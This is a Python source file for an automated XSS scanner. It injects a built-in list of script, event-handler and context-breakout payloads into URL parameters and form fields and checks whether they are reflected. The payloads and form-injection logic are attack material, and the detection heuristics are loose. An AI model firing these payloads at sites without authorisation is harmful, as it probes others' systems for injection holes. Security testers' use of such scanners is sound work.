import asyncio
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from utils.http_client import HTTPClient, ClientConfig
from bs4 import BeautifulSoup
import re


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    '<iframe src="javascript:alert(1)">',
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    '<video><source onerror="alert(1)">',
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<svg><a href="javascript:alert(1)">',
    "<script>eval(atob('YWxlcnQoMSk'))</script>",
    "<script>Function('alert(1)')()</script>",
    "javascript:alert(1)",
    # Attribute injection context
    '" onerror="alert(1)',
    "' onmouseover='alert(1)",
    '"><img src=x onerror=alert(1)>',
    # JavaScript context breakout
    "';alert(1)//",
    '";alert(1)//',
    "</script><script>alert(1)</script>",
]


@dataclass
class XSSVulnerability:
    url: str
    payload: str
    type: str
    evidence: str


@dataclass
class XSSResult:
    target: str
    start_time: datetime
    end_time: datetime
    vulnerabilities: list[XSSVulnerability] = field(default_factory=list)
    tested: int = 0
    errors: int = 0
    vulnerable: bool = False
    payload: str = ""


def _is_raw_reflected(html: str, payload: str) -> bool:
    return payload in html


def _is_encoded_reflected(html: str, payload: str) -> bool:
    encoded = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    return encoded in html


def _check_reflected(html: str, payload: str) -> bool:
    return _is_raw_reflected(html, payload) or _is_encoded_reflected(html, payload)


def _check_dom_xss(html: str) -> bool:
    dangerous_patterns = [
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"\.insertAdjacentHTML",
        r"\.write\(",
        r"document\.cookie",
        r"eval\(",
        r"Function\(",
        r"setTimeout\(",
        r"setInterval\(",
        r"<script[^>]*>",
    ]
    for pattern in dangerous_patterns:
        if re.search(pattern, html, re.IGNORECASE):
            return True
    return False


async def _test_payload(
    client: HTTPClient,
    test_url: str,
    payload: str,
) -> Optional[XSSVulnerability]:
    response = await client.get(test_url)

    if response.error:
        return None

    html = response.body or ""

    if not _check_reflected(html, payload):
        return None

    try:
        soup = BeautifulSoup(html, "lxml")
    except Exception:
        soup = BeautifulSoup(html, "html.parser")
    scripts = soup.find_all("script")

    for script in scripts:
        script_text = script.string or ""
        if payload in script_text or ("alert" in script_text):
            return XSSVulnerability(
                url=test_url,
                payload=payload,
                type="stored",
                evidence="Script tag with payload executed",
            )

    if _is_raw_reflected(html, payload):
        return XSSVulnerability(
            url=test_url,
            payload=payload,
            type="reflected",
            evidence="Payload reflected verbatim in HTML response",
        )

    if _check_dom_xss(html):
        return XSSVulnerability(
            url=test_url,
            payload=payload,
            type="dom",
            evidence="DOM XSS sink detected",
        )

    return None


def _extract_forms(html: str, base_url: str) -> list[dict]:
    """Parse <form> elements and return list of {action, method, fields}."""
    try:
        soup = BeautifulSoup(html, "lxml")
    except Exception:
        soup = BeautifulSoup(html, "html.parser")

    from urllib.parse import urljoin

    forms = []
    for form in soup.find_all("form"):
        raw_action = form.get("action") or ""
        action = str(raw_action) if raw_action else base_url
        if not action.startswith("http"):
            action = urljoin(base_url, action)
        raw_method = form.get("method") or "get"
        method = str(raw_method).lower()
        fields = [
            str(inp.get("name"))
            for inp in form.find_all(["input", "textarea", "select"])
            if inp.get("name")
        ]
        if fields:
            forms.append({"action": action, "method": method, "fields": fields})
    return forms


async def _test_payload_post(
    client: HTTPClient,
    action: str,
    field_names: list[str],
    payload: str,
) -> Optional[XSSVulnerability]:
    """POST payload into each form field and check the response."""
    for field in field_names:
        data = {f: "test" for f in field_names}
        data[field] = payload
        response = await client.post(action, data=data)
        if response.error:
            continue
        html = response.body or ""
        if not _check_reflected(html, payload):
            continue
        if _is_raw_reflected(html, payload):
            return XSSVulnerability(
                url=action,
                payload=payload,
                type="reflected",
                evidence=f"Payload reflected via POST field '{field}'",
            )
        if _check_dom_xss(html):
            return XSSVulnerability(
                url=action,
                payload=payload,
                type="dom",
                evidence=f"DOM XSS sink detected via POST field '{field}'",
            )
    return None


async def detect_xss(
    target: str,
    max_payloads: int = 20,
    threads: int = 5,
) -> XSSResult:
    start_time = datetime.now()
    result = XSSResult(target=target, start_time=start_time, end_time=start_time)

    base_url = target.split("?")[0]
    param_names: list[str] = []
    if "?" in target and "=" in target:
        _, params = target.split("?", 1)
        param_names = [p.split("=")[0] for p in params.split("&") if "=" in p]

    config = ClientConfig(rate_limit=0.2)
    client = HTTPClient(config)

    vulnerabilities: list[XSSVulnerability] = []
    errors = 0
    tested = 0

    async with client:
        semaphore = asyncio.Semaphore(threads)

        # Fetch the page to discover HTML forms for POST scanning
        page_response = await client.get(target)
        forms: list[dict] = []
        if not page_response.error and page_response.body:
            forms = _extract_forms(page_response.body, base_url)

        async def limited_test_get(payload: str) -> Optional[XSSVulnerability]:
            nonlocal errors, tested
            for param in param_names:
                async with semaphore:
                    tested += 1
                    test_url = f"{base_url}?{param}={payload}"
                    vuln = await _test_payload(client, test_url, payload)
                if vuln:
                    return vuln
            return None

        async def limited_test_post(payload: str) -> Optional[XSSVulnerability]:
            nonlocal errors, tested
            for form in forms:
                async with semaphore:
                    tested += 1
                    vuln = await _test_payload_post(
                        client, form["action"], form["fields"], payload
                    )
                if vuln:
                    return vuln
            return None

        payloads = XSS_PAYLOADS[:max_payloads]
        get_tasks = [limited_test_get(p) for p in payloads] if param_names else []
        post_tasks = [limited_test_post(p) for p in payloads] if forms else []

        all_results = await asyncio.gather(*get_tasks, *post_tasks, return_exceptions=True)

        for r in all_results:
            if isinstance(r, XSSVulnerability):
                vulnerabilities.append(r)
            elif isinstance(r, Exception):
                errors += 1

    # Early exit if no params and no forms
    if not param_names and not forms:
        result.end_time = datetime.now()
        return result

    result.vulnerabilities = vulnerabilities
    result.tested = tested
    result.errors = errors
    result.end_time = datetime.now()

    if vulnerabilities:
        result.vulnerable = True
        result.payload = vulnerabilities[0].payload

    return result
